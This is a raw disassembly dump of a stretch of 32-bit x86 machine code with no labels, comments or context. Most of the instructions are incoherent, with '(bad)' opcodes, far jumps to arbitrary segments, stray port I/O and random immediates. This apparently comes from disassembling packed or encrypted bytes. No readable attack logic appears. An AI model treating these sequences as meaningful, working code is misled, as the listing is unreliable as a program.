  41ca81:	or     esp,DWORD PTR [esi+eax*1]
  41ca84:	in     al,dx
  41ca85:	or     eax,0x9b859f33
  41ca8a:	ret    0xff7
  41ca8d:	add    bl,BYTE PTR [edi-0x10]
  41ca90:	jnp    0x41caef
  41ca92:	cmp    ah,BYTE PTR [ebx-0x26]
  41ca95:	in     al,0xd2
  41ca97:	jae    0x41ca41
  41ca99:	mov    edx,0x98c3acce
  41ca9e:	push   ss
  41ca9f:	mov    esi,0xe6ada51
  41caa4:	call   0x444b:0x81ba6dce
  41caab:	or     al,BYTE PTR [eax]
  41caad:	add    bh,al
  41caaf:	cmp    ebx,DWORD PTR [eax-0x33790b17]
  41cab5:	imul   eax,DWORD PTR [eax],0x0
  41cab8:	jae    0x41cb24
  41caba:	adc    al,0x8a
  41cabc:	jbe    0x41cac3
  41cabe:	pop    ds
  41cabf:	leave  
  41cac0:	cmp    al,0x2e
  41cac2:	mov    BYTE PTR [ebp+0x0],al
  41cac5:	add    cl,dh
  41cac7:	bound  esp,QWORD PTR [esi+eax*1-0x186e0de4]
  41cace:	ret    
  41cacf:	pushf  
  41cad0:	mov    dh,0x5b
  41cad2:	mov    al,0x70
  41cad4:	int    0x8a
  41cad6:	loop   0x41ca75
  41cad8:	mov    bh,0x9b
  41cada:	inc    edx
  41cadb:	fxtract 
  41cadd:	add    al,0x9c
  41cadf:	add    BYTE PTR [eax],al
  41cae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae2:	inc    esi
  41cae3:	inc    esi
  41cae4:	nop
  41cae5:	in     eax,dx
  41cae6:	pusha  
  41cae7:	jge    0x41caed
  41cae9:	popa   
  41caea:	add    BYTE PTR [eax],al
  41caec:	mov    al,ds:0x9ab0a73d
  41caf1:	gs cmc 
  41caf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf4:	push   ebp
  41caf5:	add    bl,BYTE PTR [ecx]
  41caf7:	adc    al,0x77
  41caf9:	add    edi,DWORD PTR [ebp+0x249b7577]
  41caff:	xor    al,0x4
  41cb01:	repz add BYTE PTR [eax],al
  41cb04:	jns    0x41cab9
  41cb06:	cdq    
  41cb07:	test   al,0xe5
  41cb09:	test   eax,0x39fce66b
  41cb0e:	(bad)  
  41cb10:	lods   eax,DWORD PTR ds:[esi]
  41cb11:	or     edx,edx
  41cb13:	jg     0x41cafb
  41cb15:	rcl    DWORD PTR [edx],cl
  41cb17:	dec    ecx
  41cb18:	jp     0x41cac6
  41cb1a:	ds stos BYTE PTR es:[edi],al
  41cb1c:	xchg   ebp,eax
  41cb1d:	call   0x237050eb
  41cb22:	push   edi
  41cb24:	jmp    0x61c0:0xf7ce8b43
  41cb2b:	add    BYTE PTR [eax],al
  41cb2d:	jle    0x41cb8c
  41cb2f:	in     eax,dx
  41cb30:	shr    DWORD PTR [edx+ecx*8-0x45],0x39
  41cb35:	cld    
  41cb36:	lahf   
  41cb37:	nop
  41cb38:	jne    0x41cb2a
  41cb3a:	and    BYTE PTR [edi],0x0
  41cb3d:	add    dl,cl
  41cb3f:	add    eax,0xd139bbc5
  41cb44:	mov    al,ds:0xb116af8b
  41cb49:	inc    ebx
  41cb4a:	ins    DWORD PTR es:[edi],dx
  41cb4b:	scas   eax,DWORD PTR es:[edi]
  41cb4c:	jne    0x41cbb4
  41cb4e:	stos   BYTE PTR es:[edi],al
  41cb4f:	mov    dl,0x1c
  41cb51:	and    edx,DWORD PTR [ebp-0x7a]
  41cb54:	sti    
  41cb55:	jle    0x41cbbf
  41cb57:	in     eax,0x99
  41cb59:	retf   0xa19
  41cb5c:	dec    edx
  41cb5d:	cmp    eax,0x850ff7ae
  41cb62:	dec    BYTE PTR [edi+0xc]
  41cb65:	push   cs
  41cb66:	add    BYTE PTR [eax],al
  41cb68:	pusha  
  41cb69:	loop   0x41cbb9
  41cb6b:	(bad)  
  41cb6c:	ins    BYTE PTR es:[edi],dx
  41cb6d:	xchg   ebp,eax
  41cb6e:	mov    ebp,0x6f18fd7e
  41cb73:	xchg   ebp,eax
  41cb74:	retf   
  41cb75:	clc    
  41cb76:	repz lds esp,FWORD PTR [edi]
  41cb79:	xor    esp,DWORD PTR [edi]
  41cb7b:	pop    eax
  41cb7c:	aam    0xd9
  41cb7e:	cmp    dl,BYTE PTR fs:[esi]
  41cb81:	jo     0x41cbb0
  41cb83:	cli    
  41cb84:	xchg   edi,eax
  41cb85:	ficom  DWORD PTR [esi+0x1b6c9527]
  41cb8b:	pushf  
  41cb8c:	adc    DWORD PTR [ecx],eax
  41cb8e:	enter  0x41,0x0
  41cb92:	jge    0x41cb64
  41cb94:	xor    cl,BYTE PTR [esi]
  41cb96:	xchg   edi,edi
  41cb98:	xor    BYTE PTR [edi+0x6195346],bl
  41cb9e:	sbb    eax,0xaf14931f
  41cba3:	xor    al,0x82
  41cba5:	ins    DWORD PTR es:[edi],dx
  41cba6:	aaa    
  41cba7:	pop    ebx
  41cba8:	mov    bl,0xce
  41cbaa:	mov    ebp,0x76910678
  41cbaf:	push   0x71
  41cbb1:	adc    eax,0x9848
  41cbb6:	sahf   
  41cbb7:	jmp    0x41fc3c
  41cbbc:	xor    al,0x18
  41cbbe:	add    BYTE PTR [edi+0x0],0x0
  41cbc2:	push   edi
  41cbc3:	add    esi,esp
  41cbc5:	or     eax,0x849b17fb
  41cbca:	xchg   ebx,eax
  41cbcb:	add    BYTE PTR [eax],al
  41cbcd:	jae    0x41cb6d
  41cbcf:	hlt    
  41cbd0:	rcl    BYTE PTR [edx+0x375c0000],0x27
  41cbd7:	popa   
  41cbd8:	jge    0x41cb9c
  41cbda:	pop    esp
  41cbdb:	dec    edx
  41cbdc:	inc    edi
  41cbdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbde:	mov    ebx,0x533e2565
  41cbe3:	inc    esi
  41cbe4:	int3   
  41cbe5:	jbe    0x41cbe7
  41cbe7:	add    BYTE PTR [edx],cl
  41cbe9:	mov    dh,0x40
  41cbeb:	inc    ecx
  41cbec:	add    BYTE PTR [eax],al
  41cbee:	pop    eax
  41cbef:	cmp    al,0x2d
  41cbf1:	mov    esp,0xe84c
  41cbf6:	cmp    eax,0x5d8825
  41cbfb:	add    BYTE PTR [ecx],al
  41cbfd:	(bad)  
  41cbfe:	sbb    dl,BYTE PTR [edi]
  41cc00:	adc    BYTE PTR [edi],dh
  41cc02:	cmp    BYTE PTR [eax+eax*1+0x47be1d00],0x2f
  41cc0a:	jle    0x41cbb8
  41cc0c:	pop    esp
  41cc0d:	push   ebp
  41cc0e:	cmp    eax,0xd3b0cb2b
  41cc13:	daa    
  41cc14:	imul   edx,DWORD PTR ds:0xb6f6c72b,0x1e
  41cc1b:	mov    ds:0xa096a51d,al
  41cc21:	sbb    cl,BYTE PTR [edi+0x20a9f4ee]
  41cc27:	repz add BYTE PTR [eax+eax*1],dl
  41cc2b:	add    BYTE PTR [esi+0x7e],dh
  41cc2e:	xor    edi,DWORD PTR [ecx]
  41cc30:	pop    esp
  41cc31:	dec    esi
  41cc32:	pop    edi
  41cc33:	dec    eax
  41cc34:	rol    BYTE PTR [eax],1
  41cc36:	add    BYTE PTR [ebp+0x6d189055],dh
  41cc3c:	inc    esp
  41cc3d:	jmp    0x41cc3f
  41cc3f:	add    cl,dh
  41cc41:	jp     0x41cc24
  41cc43:	or     eax,0xdcc32c02
  41cc48:	mov    ch,0xb1
  41cc4a:	call   0xfc78003a
  41cc4f:	ins    BYTE PTR es:[edi],dx
  41cc50:	push   ecx
  41cc51:	adc    BYTE PTR [edx+ebp*4-0x20],0x79
  41cc56:	imul   edx,esi,0xffffffa3
  41cc59:	sub    eax,0x938b6c75
  41cc5e:	xlat   BYTE PTR ds:[ebx]
  41cc5f:	mov    ah,0x9d
  41cc61:	cmp    al,0xd
  41cc63:	ja     0x41ccb0
  41cc65:	ins    WORD PTR es:[edi],dx
  41cc67:	fwait
  41cc68:	cmp    bh,bl
  41cc6a:	out    0x11,al
  41cc6c:	pop    es
  41cc6d:	(bad)  
  41cc6e:	fstp   QWORD PTR [ebp-0x369fbd0d]
  41cc74:	cmp    esp,DWORD PTR [ebp-0x26d9f10]
  41cc7a:	(bad)  
  41cc7b:	cwde   
  41cc7c:	xchg   edi,eax
  41cc7d:	bound  ecx,QWORD PTR [edx]
  41cc7f:	stc    
  41cc80:	cmp    cl,BYTE PTR [edi+0x72ca0d67]
  41cc86:	inc    ecx
  41cc87:	mov    esp,DWORD PTR [esi-0x7e94da3e]
  41cc8d:	jb     0x41cc88
  41cc8f:	adc    ebp,edi
  41cc91:	lea    ecx,ds:0xb9273a66
  41cc97:	(bad)  
  41cc98:	mov    al,ds:0xfd4912d6
  41cc9d:	push   esi
  41cc9e:	and    eax,0x5da8ae31
  41cca3:	push   0xffffff9f
  41cca5:	int    0x20
  41cca7:	mov    edi,0x63e278c3
  41ccac:	push   ebx
  41ccad:	aaa    
  41ccae:	addr16 mov ebx,0xb180ba
  41ccb4:	add    ah,bh
  41ccb6:	stc    
  41ccb7:	loopne 0x41ccbf
  41ccb9:	xchg   esi,eax
  41ccba:	or     al,0xcd
  41ccbc:	add    BYTE PTR [eax],al
  41ccbe:	inc    edi
  41ccbf:	jb     0x41ccbf
  41ccc1:	push   eax
  41ccc2:	jmp    0xb899b0
  41ccc7:	add    BYTE PTR [ecx-0x45],cl
  41ccca:	outs   dx,DWORD PTR ds:[esi]
  41cccb:	and    esp,edi
  41cccd:	(bad)  
  41ccce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cccf:	movaps xmm2,XMMWORD PTR [ebp-0x69704506]
  41ccd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd7:	lods   eax,DWORD PTR ds:[esi]
  41ccd8:	dec    esp
  41ccd9:	rol    DWORD PTR [eax],1
  41ccdb:	add    BYTE PTR ds:0x7f60bf5b,ah
  41cce1:	mov    bl,0xe
  41cce3:	or     eax,0x1fcc66ab
  41cce8:	add    BYTE PTR [eax],al
  41ccea:	mov    ebx,0x9d551110
  41ccef:	adc    BYTE PTR [ebx+0x76],ah
  41ccf2:	mov    eax,ds:0xb0dd3f46
  41ccf7:	xchg   edx,eax
  41ccf8:	in     eax,dx
  41ccf9:	jb     0x41cd60
  41ccfb:	mov    ebp,0x1421cab0
  41cd00:	inc    esi
  41cd01:	fist   WORD PTR [ecx+0x16]
  41cd04:	sbb    BYTE PTR [ebx+ebp*1],ah
  41cd07:	das    
  41cd08:	add    eax,0xc16f2a49
  41cd0d:	mov    DWORD PTR [edx+0xd484],esi
  41cd13:	xor    al,0x5d
  41cd15:	cmpps  xmm7,XMMWORD PTR [edi+ebp*1],0x7c
  41cd1a:	cli    
  41cd1b:	sti    
  41cd1c:	cmp    eax,0xefabfe54
  41cd21:	mov    ebp,0xfb34be11
  41cd26:	iret   
  41cd27:	cli    
  41cd28:	pop    ecx
  41cd29:	in     al,dx
  41cd2a:	out    0x37,eax
  41cd2c:	ret    
  41cd2d:	add    DWORD PTR [edx+ebp*8],0x86360000
  41cd34:	jbe    0x41cd7c
  41cd36:	pop    ecx
  41cd37:	sar    BYTE PTR [esi],0x0
  41cd3a:	add    al,ah
  41cd3c:	add    al,0x52
  41cd3e:	add    BYTE PTR [eax],al
  41cd40:	and    eax,0xb79b012c
  41cd45:	ret    0x1c09
  41cd48:	push   esi
  41cd49:	push   es
  41cd4a:	(bad)  
  41cd4b:	lods   eax,DWORD PTR ds:[esi]
  41cd4c:	leave  
  41cd4d:	(bad)  
  41cd4e:	xchg   ecx,eax
  41cd4f:	imul   ecx,DWORD PTR [esi],0x5b2eca72
  41cd55:	push   ss
  41cd56:	cwde   
  41cd57:	adc    al,0x3f
  41cd59:	dec    ebp
  41cd5a:	pop    ebp
  41cd5b:	scas   eax,DWORD PTR es:[edi]
  41cd5c:	ja     0x41cda6
  41cd5e:	add    DWORD PTR [eax],0x4efffd00
  41cd64:	aam    0x3e
  41cd66:	in     eax,0xc1
  41cd68:	inc    esp
  41cd69:	mov    bl,0x0
  41cd6b:	add    BYTE PTR [ebp+0x3d26ece],bl
  41cd71:	mov    ch,0x38
  41cd73:	jnp    0x41ccf6
  41cd75:	push   edx
  41cd76:	setbe  BYTE PTR [ebp+0x39c81618]
  41cd7d:	add    BYTE PTR [eax],al
  41cd7f:	mov    al,ds:0x125a4ebe
  41cd84:	sbb    al,0x16
  41cd86:	sub    BYTE PTR [eax-0x49],dh
  41cd89:	ret    0x7038
  41cd8c:	stos   DWORD PTR es:[edi],eax
  41cd8d:	pop    edx
  41cd8e:	stos   BYTE PTR es:[edi],al
  41cd8f:	cmp    al,0xd3
  41cd91:	addr16 mov bh,0x5
  41cd94:	or     ebp,DWORD PTR [ecx]
  41cd96:	jne    0x41cd36
  41cd98:	(bad)  
  41cd9a:	mov    DWORD PTR [eax],edx
  41cd9c:	cmp    eax,0x58f52614
  41cda1:	dec    eax
  41cda2:	retf   
  41cda3:	add    BYTE PTR [eax],al
  41cda5:	sbb    BYTE PTR [esi],dl
  41cda7:	jle    0x41cd63
  41cda9:	push   eax
  41cdaa:	jbe    0x41ce06
  41cdac:	stos   DWORD PTR es:[edi],eax
  41cdad:	and    al,0x52
  41cdaf:	(bad)  
  41cdb0:	fwait
  41cdb1:	test   DWORD PTR [ecx-0x51],ebx
  41cdb4:	xchg   edi,esp
  41cdb6:	jbe    0x41ce17
  41cdb8:	test   al,0x91
  41cdba:	lods   al,BYTE PTR ds:[esi]
  41cdbb:	inc    BYTE PTR [ebx]
  41cdbd:	add    cl,bh
  41cdbf:	add    BYTE PTR [eax],al
  41cdc1:	xor    bl,ch
  41cdc3:	lods   al,BYTE PTR ds:[esi]
  41cdc4:	sub    cl,bl
  41cdc6:	mov    ebp,0xd7866a59
  41cdcb:	mov    WORD PTR [eax+eax*1-0x67b9d900],ss
  41cdd2:	pushf  
  41cdd3:	jle    0x41cdab
  41cdd5:	sub    eax,0x1e0486
  41cdda:	add    BYTE PTR [ecx+0x1e],dh
  41cddd:	xor    al,0x79
  41cddf:	ja     0x41cd87
  41cde1:	(bad)  
  41cde2:	jmp    DWORD PTR ds:0x258c81
  41cde8:	add    BYTE PTR [edi+0x47],bl
  41cdeb:	call   0x8720995c
  41cdf0:	inc    ebx
  41cdf1:	add    edi,esp
  41cdf3:	call   0xf4ee:0xd3d6e1a8
  41cdfa:	in     al,dx
  41cdfb:	ret    0xe14
  41cdfe:	(bad)  
  41cdff:	mov    edi,0x324b2765
  41ce04:	dec    eax
  41ce05:	dec    ebp
  41ce06:	add    BYTE PTR [eax],al
  41ce08:	arpl   WORD PTR [eax+edi*4+0x9d40fa],sp
  41ce0f:	add    BYTE PTR [ebp-0x29],ah
  41ce12:	xor    al,0xec
  41ce14:	mul    BYTE PTR [edi]
  41ce16:	cdq    
  41ce17:	pop    eax
  41ce18:	mov    ds:0xcc0a7f92,eax
  41ce1d:	pop    edx
  41ce1e:	add    BYTE PTR [eax],al
  41ce20:	mov    eax,ds:0xa67d23af
  41ce25:	inc    eax
  41ce26:	inc    edi
  41ce27:	add    BYTE PTR [eax],al
  41ce29:	cli    
  41ce2a:	and    DWORD PTR [edx-0xc6603ee],esp
  41ce30:	or     DWORD PTR [ecx],esi
  41ce32:	jle    0x41cdd0
  41ce34:	int    0x76
  41ce36:	outs   dx,BYTE PTR ds:[esi]
  41ce37:	cmp    BYTE PTR [ecx],dh
  41ce39:	adc    al,0x92
  41ce3b:	fmul   DWORD PTR [esi]
  41ce3d:	sub    al,0xe1
  41ce3f:	dec    eax
  41ce40:	aam    0x0
  41ce42:	add    BYTE PTR [ebp+esi*2-0x623e0000],al
  41ce49:	add    DWORD PTR [ebp-0x7d],0x32
  41ce4d:	stos   BYTE PTR es:[edi],al
  41ce4e:	std    
  41ce4f:	fistp  QWORD PTR [edx-0x35]
  41ce52:	out    0x13,eax
  41ce54:	mov    eax,ds:0x66c427
  41ce59:	add    BYTE PTR [ebx],cl
  41ce5b:	fild   DWORD PTR es:[ecx-0x60]
  41ce5f:	jae    0x41ce99
  41ce61:	imul   esi,edx,0x10
  41ce64:	fdiv   st(2),st
  41ce66:	pop    ebx
  41ce67:	popa   
  41ce68:	push   0xa4031e01
  41ce6d:	pop    ds
  41ce6e:	std    
  41ce6f:	inc    eax
  41ce70:	retf   0x0
  41ce73:	jns    0x41ce71
  41ce75:	cmp    edx,0x5c05a4ab
  41ce7b:	mov    al,ds:0x22c25d19
  41ce80:	and    al,0x6f
  41ce82:	je     0x41ce3c
  41ce84:	sar    BYTE PTR [esp+ebp*4+0x401ebe6b],cl
  41ce8b:	mov    DWORD PTR [eax],0x29f52d00
  41ce91:	cmp    ch,BYTE PTR [esi+ebx*8+0x12]
  41ce95:	and    al,0x77
  41ce97:	dec    edx
  41ce98:	in     eax,dx
  41ce99:	loop   0x41cecf
  41ce9b:	or     DWORD PTR [edi],edx
  41ce9d:	xchg   DWORD PTR [ecx-0x19bf7951],edx
  41cea3:	add    BYTE PTR [eax],al
  41cea5:	mov    ch,0x4d
  41cea7:	xchg   esi,eax
  41cea8:	pop    es
  41cea9:	es sub ecx,esi
  41ceac:	retf   0xbb9b
  41ceaf:	cdq    
  41ceb0:	sub    DWORD PTR [esi],0xffffff9d
  41ceb3:	leave  
  41ceb4:	adc    al,0x11
  41ceb6:	(bad)  
  41ceb7:	pop    ss
  41ceb8:	test   eax,0x144
  41cebd:	je     0x41ce5b
  41cebf:	into   
  41cec0:	mov    dh,BYTE PTR ds:0xf9429ae6
  41cec6:	enter  0xac,0x0
  41ceca:	sbb    eax,0x75783233
  41cecf:	inc    eax
  41ced0:	push   ds
  41ced1:	add    BYTE PTR [eax],al
  41ced3:	mov    esi,0x74d9d864
  41ced8:	je     0x41cef7
  41ceda:	mov    eax,0x5dd7edb3
  41cedf:	add    BYTE PTR [ecx+0x69270000],ch
  41cee5:	xchg   esi,eax
  41cee6:	pop    ebx
  41cee7:	loope  0x41cedc
  41cee9:	aam    0xd2
  41ceeb:	cwde   
  41ceec:	cmp    al,0xf0
  41ceee:	xor    eax,0xf3520952
  41cef3:	mov    DWORD PTR [ebp+0x284f9cc6],0xed4df629
  41cefd:	xor    ebx,DWORD PTR [ecx+0xb1c47f]
  41cf03:	add    BYTE PTR [eax+0x6c],ah
  41cf06:	mov    ah,0x23
  41cf08:	sbb    cl,bl
  41cf0a:	sbb    DWORD PTR [ecx+0x4bdc8d90],ecx
  41cf10:	or     al,0x36
  41cf12:	add    BYTE PTR [eax],al
  41cf14:	fisttp QWORD PTR [edx+0x21]
  41cf17:	loopne 0x41cf43
  41cf19:	adc    eax,0xff0d850a
  41cf1e:	dec    esp
  41cf1f:	stos   DWORD PTR es:[edi],eax
  41cf20:	add    BYTE PTR [eax],al
  41cf22:	sub    al,0x4f
  41cf24:	sub    BYTE PTR [edx+0x2666d826],ch
  41cf2a:	imul   ecx,esi,0xa
  41cf2d:	rcr    DWORD PTR [edx+ebp*4],cl
  41cf30:	shl    DWORD PTR [edx],0x16
  41cf33:	scas   eax,DWORD PTR es:[edi]
  41cf34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf35:	mov    dl,0xa6
  41cf38:	sub    DWORD PTR [esi+0x42],esi
  41cf3b:	xor    eax,0x3ec75b79
  41cf40:	pop    ebp
  41cf41:	dec    eax
  41cf42:	jb     0x41cf44
  41cf44:	add    ah,bl
  41cf46:	data16 out 0x2b,al
  41cf49:	xor    DWORD PTR [esi+0xbcd2181],0xffffffb0
  41cf50:	sbb    al,0x4c
  41cf52:	jnp    0x41cf54
  41cf54:	add    dh,bh
  41cf56:	rcr    DWORD PTR [esi],0xd5
  41cf59:	and    al,0x50
  41cf5b:	jecxz  0x41cefe
  41cf5d:	xchg   esi,eax
  41cf5e:	mov    bl,0x45
  41cf60:	stos   DWORD PTR es:[edi],eax
  41cf61:	inc    esi
  41cf62:	out    0xd7,al
  41cf64:	push   cs
  41cf65:	mov    bl,BYTE PTR [eax-0x30]
  41cf68:	sti    
  41cf69:	popa   
  41cf6a:	inc    edi
  41cf6b:	cli    
  41cf6c:	lods   al,BYTE PTR ds:[esi]
  41cf6d:	retf   0x8461
  41cf70:	sub    al,BYTE PTR [eax]
  41cf72:	add    ah,bl
  41cf74:	cmp    BYTE PTR [ecx-0x4d],ah
  41cf77:	icebp  
  41cf78:	imul   cx,WORD PTR [esi+0x74c0d9ae],0x0
  41cf81:	inc    edi
  41cf82:	mov    ch,0x3a
  41cf84:	cs mov ecx,0x8a3c1477
  41cf8a:	mov    ebp,DWORD PTR [esi]
  41cf8c:	imul   eax,DWORD PTR [ebp-0x6f5bcf1],0xffffff86
  41cf93:	xchg   esp,eax
  41cf94:	lds    ebp,FWORD PTR [ebp+0x50]
  41cf97:	fmul   st(7),st
  41cf99:	jbe    0x41cf26
  41cf9b:	test   BYTE PTR [esi],bh
  41cf9d:	add    BYTE PTR [eax],al
  41cf9f:	test   al,0x98
  41cfa1:	and    esp,ebx
  41cfa3:	adc    ah,BYTE PTR [ebx-0x40]
  41cfa6:	loopne 0x41cfa8
  41cfa8:	add    BYTE PTR [edi+0x1],dh
  41cfab:	dec    ebp
  41cfac:	push   edx
  41cfad:	popa   
  41cfae:	mov    ds:0xe063d8af,al
  41cfb3:	lds    eax,FWORD PTR [ecx+esi*1+0x0]
  41cfb7:	add    BYTE PTR [eax],ah
  41cfb9:	inc    ecx
  41cfba:	inc    DWORD PTR [ebx-0x6da3724e]
  41cfc0:	pop    edi
  41cfc1:	jo     0x41cf7a
  41cfc3:	retf   
  41cfc4:	adc    eax,0x776fe113
  41cfc9:	sbb    DWORD PTR [edi+0x5e05acab],edx
  41cfcf:	scas   al,BYTE PTR es:[edi]
  41cfd0:	xor    bl,bh
  41cfd2:	dec    esi
  41cfd3:	addr16 mov dl,0xd5
  41cfd6:	and    esi,ebx
  41cfd8:	mov    ebp,0x30fef1e5
  41cfdd:	lods   eax,DWORD PTR ds:[esi]
  41cfde:	add    ah,BYTE PTR [eax-0x3f50d83d]
  41cfe4:	push   ebp
  41cfe5:	add    BYTE PTR [eax],al
  41cfe7:	outs   dx,DWORD PTR ds:[esi]
  41cfe8:	sub    eax,0x2cea877b
  41cfed:	or     eax,0x8c9481c9
  41cff2:	fadd   QWORD PTR [eax]
  41cff4:	add    BYTE PTR [edi-0xf9fc48c],ch
  41cffa:	mov    eax,DWORD PTR [edi]
  41cffc:	mov    cl,0xfa
  41cffe:	iret   
  41cfff:	pop    ecx
  41d000:	not    DWORD PTR [eax-0x710054e5]
  41d006:	mov    al,0x3a
  41d008:	(bad)  
  41d009:	xor    ch,ah
  41d00b:	jg     0x41d00b
  41d00d:	push   cs
  41d00e:	ss jo  0x41cfd5
  41d011:	sbb    eax,DWORD PTR [eax]
  41d013:	add    BYTE PTR [ebp-0x30],ah
  41d016:	cmc    
  41d017:	push   eax
  41d018:	in     al,dx
  41d019:	ins    DWORD PTR es:[edi],dx
  41d01a:	addr16 mov ecx,0x8384f062
  41d020:	add    BYTE PTR [eax],al
  41d022:	mov    DWORD PTR [ebp-0x2a3fa3fa],ebx
  41d028:	add    BYTE PTR [eax],al
  41d02a:	jmp    0x4efe542
  41d02f:	mov    edx,0x2c2e0000
  41d034:	jg     0x41d04a
  41d036:	aad    0x17
  41d038:	fucompp 
  41d03a:	inc    esp
  41d03b:	call   0xed05:0xd2110000
  41d042:	mov    ebx,0x9c8f3e76
  41d047:	pop    edi
  41d048:	lahf   
  41d049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d04a:	es mov ah,0xcc
  41d04d:	xlat   BYTE PTR ds:[ebx]
  41d04e:	add    BYTE PTR [eax],al
  41d050:	in     eax,dx
  41d051:	imul   esi,DWORD PTR [edi+0x42],0x36
  41d055:	push   eax
  41d056:	iret   
  41d057:	imul   esp,DWORD PTR [edi],0x6d8517ce
  41d05d:	dec    ecx
  41d05e:	mov    DWORD PTR [ecx-0xd66746d],edx
  41d064:	cwde   
  41d065:	cmp    al,0x68
  41d067:	mov    ds:0xb9765860,eax
  41d06c:	add    BYTE PTR [edx+0x15],0x65
  41d070:	ror    DWORD PTR [edx-0x5d],cl
  41d073:	shr    BYTE PTR [esi-0x77d84ceb],1
  41d079:	inc    edi
  41d07a:	add    BYTE PTR [eax],al
  41d07c:	frstor [ebx+0x353f4a8a]
  41d082:	jne    0x41d100
  41d084:	lock pop ss
  41d086:	arpl   ax,dx
  41d088:	ret    0xc937
  41d08b:	call   0x506cafb9
  41d090:	in     eax,0xdf
  41d092:	push   0x6e
  41d094:	imul   edx,DWORD PTR [ebx+eax*1-0x648552f],0xffffffea
  41d09c:	int    0x22
  41d09e:	adc    al,0xe9
  41d0a0:	push   0xfffffff9
  41d0a2:	cmc    
  41d0a3:	pop    esp
  41d0a4:	sbb    esi,edx
  41d0a6:	jo     0x41d058
  41d0a8:	test   edi,edx
  41d0aa:	dec    ecx
  41d0ab:	adc    bh,ah
  41d0ad:	xchg   esp,eax
  41d0ae:	sub    bl,BYTE PTR [ebx+0x7a07eedc]
  41d0b4:	add    esi,DWORD PTR [ecx-0x79]
  41d0b7:	loopne 0x41d049
  41d0b9:	in     eax,dx
  41d0ba:	adc    eax,0x607016c
  41d0bf:	pop    DWORD PTR [ebx]
  41d0c1:	jp     0x41d0bf
  41d0c3:	push   DWORD PTR [ebx+0xf00421]
  41d0c9:	add    BYTE PTR [esi-0x24fa609f],bh
  41d0cf:	arpl   WORD PTR [edx],dx
  41d0d1:	or     ah,0xb9
  41d0d4:	add    BYTE PTR [eax],al
  41d0d6:	loop   0x41d0c6
  41d0d8:	mov    al,ch
  41d0da:	les    ecx,FWORD PTR [ebp-0x31560000]
  41d0e0:	mov    bl,0x2
  41d0e2:	(bad)  
  41d0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0e4:	shl    DWORD PTR [eax],cl
  41d0e6:	out    0xe,eax
  41d0e8:	repz out 0xa,eax
  41d0eb:	in     eax,dx
  41d0ec:	sub    eax,0xb1b44779
  41d0f1:	retf   0x5ab0
  41d0f4:	int    0x8c
  41d0f6:	and    al,0x0
  41d0f8:	add    bh,dh
  41d0fa:	mov    ch,0xec
  41d0fc:	mov    bh,0xae
  41d0fe:	inc    esi
  41d0ff:	mov    esp,0x290e7a20
  41d104:	adc    al,0xdd
  41d106:	inc    edx
  41d107:	push   edi
  41d108:	and    BYTE PTR [edx-0x64],0x53
  41d10c:	bound  edx,QWORD PTR [ecx-0x4e1c79df]
  41d112:	std    
  41d113:	push   ebx
  41d114:	jge    0x41d151
  41d116:	scas   eax,DWORD PTR es:[edi]
  41d117:	nop
  41d118:	mov    dl,0xb0
  41d11a:	adc    bh,BYTE PTR [ebx+0x39]
  41d11d:	jl     0x41d174
  41d11f:	xchg   ch,bh
  41d121:	mov    ebx,0x12f5dfe5
  41d126:	mov    edi,0xe3fec921
  41d12b:	and    BYTE PTR [ebp-0x799255ba],bl
  41d131:	mov    ds:0xe9b7df39,al
  41d136:	(bad)  
  41d137:	stos   BYTE PTR es:[edi],al
  41d138:	push   eax
  41d139:	aas    
  41d13a:	cdq    
  41d13b:	xor    DWORD PTR ds:0x71ee12d2,ebp
  41d141:	push   cs
  41d142:	mov    ch,0xe8
  41d144:	sar    DWORD PTR [ebp+0x39],cl
  41d147:	enter  0x91,0x0
  41d14b:	fldpi  
  41d14d:	in     eax,dx
  41d14e:	xchg   ebp,eax
  41d14f:	iret   
  41d150:	stos   DWORD PTR es:[edi],eax
  41d151:	adc    eax,0x5056dbc7
  41d156:	xlat   BYTE PTR ds:[ebx]
  41d157:	mov    ebp,0x70163ee7
  41d15c:	push   edi
  41d15d:	jbe    0x41d15a
  41d15f:	pop    eax
  41d160:	ror    DWORD PTR [ecx],0x9b
  41d163:	nop
  41d164:	lock outs dx,BYTE PTR ds:[esi]
  41d166:	mov    ebp,es
  41d168:	add    BYTE PTR [eax],al
  41d16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d16b:	call   0xbcdd4813
  41d170:	in     al,0x55
  41d172:	std    
  41d173:	jle    0x41d1be
  41d175:	jecxz  0x41d1a7
  41d177:	imul   ebp,DWORD PTR [ebx+0xb],0x2c3f8175
  41d17e:	xor    eax,esp
  41d180:	cmp    ebx,DWORD PTR [ebp+0x38]
  41d183:	adc    cl,BYTE PTR [ebx-0x77]
  41d186:	or     DWORD PTR [edx],ebx
  41d188:	in     eax,dx
  41d189:	gs out 0x62,eax
  41d18c:	mov    ss,WORD PTR ds:0x19c0c2
  41d192:	add    BYTE PTR ds:0x9bc9976a,ch
  41d198:	sahf   
  41d199:	ins    BYTE PTR es:[edi],dx
  41d19a:	jge    0x41d14e
  41d19c:	rcr    eax,1
  41d19e:	fist   DWORD PTR [ebx]
  41d1a0:	dec    ebx
  41d1a1:	loope  0x41d161
  41d1a3:	mov    DWORD PTR [esi+eax*1+0x659521d3],edx
  41d1aa:	xchg   DWORD PTR [edx],eax
  41d1ac:	shr    DWORD PTR [esi+0x11f4373f],0xf5
  41d1b3:	mov    ebx,0xa784a0
  41d1b8:	add    bh,bl
  41d1ba:	xchg   DWORD PTR [ebx+ebp*1+0x53499e22],esi
  41d1c1:	inc    eax
  41d1c2:	xor    DWORD PTR [eax],eax
  41d1c4:	add    BYTE PTR [edx],bl
  41d1c6:	xchg   ebx,eax
  41d1c7:	mov    WORD PTR [eax],?
  41d1c9:	add    BYTE PTR [eax],al
  41d1cb:	mov    ecx,0xb5f770ef
  41d1d0:	sahf   
  41d1d1:	xor    BYTE PTR [edx-0x2d70000],0x23
  41d1d8:	jo     0x41d15c
  41d1da:	leave  
  41d1db:	pushf  
  41d1dc:	mov    WORD PTR [edx+0x5d160000],gs
